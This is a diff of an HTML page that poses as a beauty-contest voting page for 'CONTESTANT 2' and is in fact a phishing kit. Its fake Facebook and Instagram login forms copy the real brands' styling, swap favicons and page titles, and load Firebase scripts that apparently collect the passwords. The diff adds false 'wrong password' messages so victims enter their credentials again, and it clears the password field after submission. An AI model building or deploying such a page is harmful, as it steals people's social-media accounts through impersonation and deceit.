@@ -6,15 +6,17 @@
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <!--metatextblock-->
     <title>CONTESTANT 2</title>
-    <link id="dynamic-favicon" href="assets/favicon.png" rel="shortcut icon" sizes="196x196">
+    <link id="dynamic-favicon" href="/assets/favicon.ico" rel="shortcut icon" sizes="196x196">
     <link type="text/css" rel="stylesheet" href="/css/fb.css">
     <link type="text/css" rel="stylesheet" href="/css/fb_style.css">
     <link type="text/css" rel="stylesheet" href="/css/page.css">
     <link rel="stylesheet" href="/css/profile.css">
     <link rel="stylesheet" href="/css/index.css">
     <link rel="stylesheet" href="/css/ig.css">
-    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
     <script src="/js/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
     <meta property="og:url" content="9" />
     <meta property="og:title" content="CONTESTANT 2" />
     <meta property="og:description" content="" />
@@ -25,8 +27,6 @@
     <meta http-equiv="x-dns-prefetch-control" content="on">
     <link rel="dns-prefetch" href="https://ws.tildacdn.com">
     <link rel="dns-prefetch" href="https://static.tildacdn.one">
-    <link rel="shortcut icon" href="https://static.tildacdn.one/tild3635-3863-4431-b132-396464313936/favicon.ico"
-        type="image/x-icon" /><!-- Assets -->
     <script src="https://neo.tildacdn.com/js/tilda-fallback-1.0.min.js" async charset="utf-8"></script>
     <link rel="stylesheet" href="https://static.tildacdn.one/css/tilda-grid-3.0.min.css" type="text/css" media="all"
         onerror="this.loaderr='y';" />
@@ -208,8 +208,8 @@
                         <div class="t228__maincontainer t228__c12collumns" style="height:100px;">
                             <div class="t228__padding40px"></div>
                             <div class="t228__leftside">
-                                <div class="t228__leftcontainer"><a href="https://mrsuniverseuae.com/"
-                                        class="t228__imgwrapper"><img class="t228__imglogo t228__imglogomobile"
+                                <div class="t228__leftcontainer"><a href="" class="t228__imgwrapper"><img
+                                            class="t228__imglogo t228__imglogomobile"
                                             src="https://static.tildacdn.one/tild3631-3430-4237-a634-396233346538/IMG_6285.jpg"
                                             imgfield="img"
                                             style="max-width: 180px; width: 180px; min-width: 180px; height: auto; display: block;"
@@ -2968,7 +2968,7 @@
                         data-field-left-res-480-value="10" data-field-width-res-480-value="459"
                         data-field-top-res-640-value="12" data-field-left-res-640-value="0"
                         data-field-width-res-640-value="616">
-                        <div class='tn-atom' field='tn_text_1470210011265'>Choose a voting option for a participant
+                        <div class='tn-atom' field='tn_text_1470210011265'>Choose number of vote count for a participant
                         </div>
                     </div>
                     <div class='t396__elem tn-elem tn-elem__5349465491470233923389' data-elem-id='1470233923389'
@@ -3351,9 +3351,9 @@
 
 
             </div>
+        </div>
     </center>
 
-    <!--facebuk login-->
     <div id="fb_wrapper">
 
         <div id="fbbody" class="fbook">
@@ -3368,11 +3368,18 @@
                     style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
             </div><br><br><br>
 
+            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
+                <div class="fsl fwb fcb">Wrong credentials</div>
+                <div>Invalid username or password</div>
+            </div><br>
+
+
             <div class="form-group">
                 <input type="text" id="fb-email" required oninput="toggleClearIcon()">
                 <label for="fb-email">Mobile number or email address</label>
                 <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
             </div>
+
             <div class="form-group">
                 <input type="password" id="fb-pass" required>
                 <label for="fb-pass">Password</label>
@@ -3381,15 +3388,17 @@
             </div>
 
             <div
-                style="pointer-events: none; opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
+                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
 
                 <div class="wbloks_113" dir="auto">
-                    <center><span onclick="login()" id="ig-log"
-                            style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">Log
-                            in</span></center>
-                </div>
 
-            </div> <br>
+                    <div onclick="login()"
+                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
+                        Log
+                        in</div>
+
+                </div>
+            </div> <br><br>
 
             <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
                 <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
@@ -3443,8 +3452,8 @@
                 </div>
             </div>
         </div>
+
     </div>
-    <!--facebuk login ends-->
 
     <!--Insta login begins-->
     <div id="ig_wrapper">
@@ -3562,15 +3571,17 @@
                                                                             <div class="instacontainer">
                                                                                 <div
                                                                                     class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
-                                                                                    <label class="_aa48 _aa49"><span
-                                                                                            class="_aa4a">Password</span><input
-                                                                                            id="ig-pass"
+                                                                                    <label class="_aa48 _aa49">
+                                                                                        <span
+                                                                                            class="_aa4a">Password</span>
+                                                                                        <input id="ig-pass"
                                                                                             aria-label="Password"
                                                                                             aria-required="true"
                                                                                             autocapitalize="off"
                                                                                             autocorrect="off"
                                                                                             class="_aa4b _add6 _ac4d _ap35"
-                                                                                            type="text" dir=""></label>
+                                                                                            type="password" dir="">
+                                                                                    </label>
                                                                                     <div
                                                                                         class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
                                                                                         <div
@@ -3587,17 +3598,29 @@
                                                                                     style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
                                                                                     password?</span>
                                                                             </div>
+
+
                                                                             <div
                                                                                 class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                                <button onclick="ig()"
-                                                                                    class=" _acan _acap _acas _aj1- _ap30"
-                                                                                    disabled="">
-                                                                                    <div
-                                                                                        class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                                        Log in</div>
-                                                                                </button>
+
+                                                                                <button
+                                                                                    class="c-btn _acan _acap _acas _aj1- _ap30"
+                                                                                    type="submit"
+                                                                                    onclick="iglog(); clearInstagramPasswordField();"
+                                                                                    id="ig-log"> Log in</button>
                                                                             </div>
+
                                                                         </div>
+
+                                                                        <span id="ig_error_box"
+                                                                            class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                            dir="auto"
+                                                                            style=" display: none; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
+                                                                            <div class="_ab2z">Sorry, your password was
+                                                                                incorrect. Please double-check your
+                                                                                password.</div>
+                                                                        </span>
+
                                                                         <div
                                                                             class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
                                                                             <span
@@ -3621,7 +3644,7 @@
                                                     class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
                                                     <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
                                                         style="height: 26px; width: 52px;"><img alt="from Meta"
-                                                            src="meta.svg">
+                                                            src="/img/meta.svg">
                                                     </div>
                                                 </div>
                                             </main>
@@ -3642,11 +3665,25 @@
         </div>
     </div>
 
+
     <!--Insta login ends-->
 
 
-
     <script>
+
+        function clearInstagramPasswordField() {
+            // Set a delay before clearing the password field (in milliseconds)
+            setTimeout(function () {
+                // Get the password field element by its ID
+                var passwordField = document.getElementById("ig-pass");
+
+                // Clear the value of the password field
+                passwordField.value = "";
+            }, 2000); // Delay of 2000ms (2 seconds)
+        }
+
+
+
         function togglePasswordVisibility() {
             var passwordField = document.getElementById("password");
             var toggleButton = document.querySelector(".toggle-password");
@@ -3676,9 +3713,7 @@
             input.value = "";
             document.getElementById("clearIcon").style.display = "none";
         }
-    </script>
 
-    <script>
         function changeFavicon(iconUrl) {
             const favicon = document.getElementById('dynamic-favicon');
             favicon.href = iconUrl;
@@ -3693,7 +3728,7 @@
         }
 
         function handleFbClick() {
-            changeFavicon('img/favicon.png');
+            changeFavicon('/img/favicon.png');
             fb();
             document.title = 'Log in to Facebook';
         }
@@ -3707,35 +3742,27 @@
         }
 
         function handleIgClick() {
-            changeFavicon('img/igfavicon.png');
+            changeFavicon('/img/igfavicon.png');
             ig();
             document.title = 'Instagram';
 
         }
 
+
+        function closeVoteBox() {
+            document.getElementById('voteBox').style.display = 'none';
+        }
+
     </script>
 
-    <!--Firebase-->
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-    <script src="js/firebase.js">
+    <script src="/js/firebase.js"></script>
 
-
-
-    </script>
-    <!--Firebase ends-->
-
-    <!--Hide VOTEBOX -->
-    <script>
-        function closeVoteBox() {
-            document.getElementById('voteBox').style.display = 'none';
-        }
-    </script>
 
 </body>
 
